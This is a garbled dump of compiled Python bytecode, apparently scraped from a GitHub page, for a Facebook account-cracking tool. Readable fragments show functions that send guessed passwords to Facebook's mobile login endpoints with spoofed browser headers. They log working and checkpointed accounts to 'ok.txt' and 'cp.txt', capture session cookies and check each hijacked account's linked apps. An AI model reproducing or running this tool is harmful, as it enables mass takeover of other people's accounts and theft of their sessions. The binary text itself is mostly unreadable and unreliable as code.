t�t|�t|�tfdd�tj��t�t�}t�t�}t��}|D]�}	z�t��}
|j�dd|ddd	d
ddd
dddd�
�|�d�j}t�dt|���d�t�dt|���d�|d|	dd�}|j�ddddd|dd	d
ddd
dddd��|j d|dd�}
d |
j!�"��#�vr�td!t$||	f�t�%d"||	f�t&d#d$��'d%||	f�t&d&d$��'d'||	f�WnTd(|j!�"��#�v�rd)�(d*d+�|j!�"��)�D��}td,t||	tf�t*|�t
�%d-||	|f�t&d.d$��'d/||	|f�WnWqGtj+j,�y*t�-d0�YqGwt	d7a	dS)1N�d�%u0
%s [iraq ●] %s|%s [OK:-%s-CP:-%s] ● %s%s%s r�)�endzm.facebook.comrqr"r�r�r#r$r�zhttps://m.facebook.com/r%r&r'zlhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr(rr)r*r+r,r�zhttps://m.facebook.comr�r�zChttps://m.facebook.com/login/device-based/validate-password/?shbl=0Fr�r�u
 %s[iraq-CP] %s  • %sz%s|%szcp.txtr�z%s|%s
zcheckcp.txtz[iraq-CP] %s|%s
r�r�cSr�r�rr�rrrr�Ir�z crack.metod2.<locals>.<listcomp>u*
 %s[iraq-Ok] %s • %s                 %sz%s|%s|%szok.txtz
--> %s|%s|%s
r5).r�r�rVrrOr��JrS�Br6r�rrr7r8r�r	rr9r;�ugen�ugen2rr�rr�rrrr�r�r9r_r�r�keysr�r�rRr:r
rr:rirjr)rEr�r�ZramZfikAZ	nufikhaXDr�Zua2rr�Ztixr=r>r@rArrrr1sB@

(6,�zcrack.metod2cCs�t�ttttg�}t�ttttg�}tj�d|t	tt	t
t|j�tt
�tt�|f	�tj���z�|D�]�}|��}t��}t�gd��}dd|dddddd	d
ddd
d�
}|jd|d�j}	t�dt|	���d�t�dt|	���d�|d|dd�}
ddddddddddd	d
ddd
d�}|jd|
|dd�}d|j��v�r:zbd �d!d"�|j����D��}
td#d$���}t�d%|�d&|���� �d'}|�!d(�\}}}t"|}t#d)t||||||
f�t$|
�t
�%d*|||||t&f�td+d,��d-||||||
f�Wn�t't(f�yd.}d.}d.}YnYt#d/t|||
f�t$|
�t
�%d0|||
f�td+d,��d1|||
f�n�d2|j��v�r�zLtd#d$���}t�d%|�d&|���� �d'}|�!d(�\}}}t"|}t#d3t|||||f�t�%d4|||||f�td5d,��d6|||||f�Wn6t't(f�y�d.}d.}d.}YnYt#d7t||f�t�%d8||f�td5d,��d9||f�nq3t
d7a
WdStj)j*�y�t+�,d:�t
d7a
|�-||�YdSw);Nz,
 %s* %s[%scrack%s] %s/%s [OK:%s CP:%s] %s* r�r�rqr"r�r�r#r$r�zhttps://mbasic.facebook.com/r%r&r'zqhttps://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2Fr�r(rr)r*r+r,r�r�r�z�Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36r�zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0Fr.r�r�cSr/r0rr�rrrr�gr�z crack.mbasic.<locals>.<listcomp>rMr7rtr3r�r4u+
 %s[iraq-OK] %s • %s • %s %s %s • %su%s • %s • %s %s %s • %s r~r�u* [iraq-OK] %s ◊ %s ◊ %s %s %s ◊ %s 
rJu
 %s[iraq-OK] %s • %s • %sr2u [iraq-Ok] %s ◊ %s ◊ %s
r�u$
 %s[iraq-CP] %s • %s • %s %s %su%s • %s • %s %s %sru" [iraq-CP] %s • %s • %s %s %s
u
 %s[iraq-CP] %s • %sr4u [iraq-CP] %s • %s
r5).r�r�rVr�rOr�rr9r:rSr6r�rr7r8r;r�rr�rrr�r�r	r9r_r�rr
rrRr]rQr�r;rr:r�ZkukisrUr^rirjrrr)rEr�r�ZaswZmmkr�rr�r<r=r>r?r@rAr�rErBrCrDrrrrVs~:
 6$ 
�zcrack.mbasicN)rcrdrerFr�rrrrrrrrrrrr�ZsB
=%r�c
CsLt��}|jddd|id�j}t�|d�}|jddd�}d	d
�|�d�D�}ztt	|��D]}t
dt|d
t||�
dd�f�q.WntySt
dt�Ynw|jddd|id�j}t�|d�}|jddd�}dd
�|�d�D�}ztt	|��D]}t
dt|d
t||�
dd�f�q~WdSty�t
dt�YdSw)Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activer�znoscript=1;r�r�r�r_)r�cSr�rr�r�rrrr��r�zcek_apk.<locals>.<listcomp>Zh3z
      %s%s %s%srzDitambahkan padaz Ditambahkan padaz
      %s! cookie invalidz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivecSr�rr�r�rrrr��r�ZKedaluwarsaz Kedaluwarsau
      %s• cookie invalid)rr�rr�bs4rrrr�r�rrSrOr��AttributeErrorr�rV)rAZsessionr6Zsop�xZgamer�rrrr:�s.&��&��r:rzgit pull)Vr
r�ImportErrorrrZconcurrent.futuresZ
concurrentrNr�rrQrr�rr��	threading�	itertools�base64rZAzimVaurrZnowZctrC�nZbulanrZnTemp�
ValueErrorZcalendarZloggingr�rZbulan_�currentrBZharirDZtahunZbullanr;rrVrOr�rJr�r\rSrIr�Zkomenr��miZstatus_follZcrr7r8rr6ZloopingZtaZbuZha�oprkr�rRr:r]�
splitlinesrKrLr=r?r@rAr`r�r�r�r�r:rcrarrrr�<module>s����h
�`
�,
%ub,@



�
Footer
© 2022 GitHub, Inc.
Footer navigation
Terms
Privacy
Security
Status
Docs
Contact GitHub
